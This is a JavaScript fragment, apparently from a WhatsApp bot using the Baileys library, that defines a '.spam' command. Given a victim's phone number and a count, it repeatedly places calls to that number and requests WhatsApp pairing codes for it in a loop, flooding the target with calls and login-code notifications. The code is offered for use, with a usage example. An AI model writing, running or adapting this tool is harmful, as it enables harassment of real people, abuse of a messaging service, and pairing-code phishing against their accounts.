case 'spam': {
  if (!isBot) return;
  if (args.length < 1) return reply(`Example: .spam +49 15678 100000, 5`);
  const [mobileNumber, spamCountStr] = args.join(" ").split(',').map(arg => arg.trim());
  const target1 = mobileNumber.replace(/[+\s()-]/g, '') + '@s.whatsapp.net';
  const target2 = mobileNumber.replace(/[+\s()-]/g, '');
  const spam1 = parseInt(spamCountStr);
  const {
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    makeWaSocket
  } = require('@whiskeysockets/baileys');
  const { state } = await useMultiFileAuthState('./database/Spam');
  const { version } = await fetchLatestBaileysVersion();
  let spam = await makeWaSocket({
    auth: state,
    version,
    logger: pino({ level: 'fatal' })
    }
  )
  for (let i = 0; i < spam1; i++) {
    await sock.offerCallChat(target1);
    await sleep(1000);
    const code = await spam.requestPairingCode(target2);
  }
}
break;